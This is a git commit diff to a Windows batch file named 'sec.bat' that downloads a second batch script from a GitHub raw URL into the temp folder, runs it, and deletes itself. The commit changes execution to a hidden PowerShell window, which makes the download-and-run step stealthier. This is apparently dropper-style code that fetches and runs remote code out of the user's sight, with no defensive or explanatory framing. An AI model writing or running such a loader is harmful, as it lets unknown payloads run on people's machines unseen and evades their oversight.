7e4584610ffb7938ba17b0f0c2986c2cbae99856
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 07:00:01 +0300

    Update sec.bat

--- sec.bat
+++ sec.bat
@@ -1,4 +1,4 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/shell/main/sec1.bat -o %temp%\sec1.bat
-start /MIN %temp%\sec1.bat
+powershell.exe -WindowStyle Hidden -Command "Start-Process '%temp%\sec1.bat' -WindowStyle Hidden"
 del "%~f0"
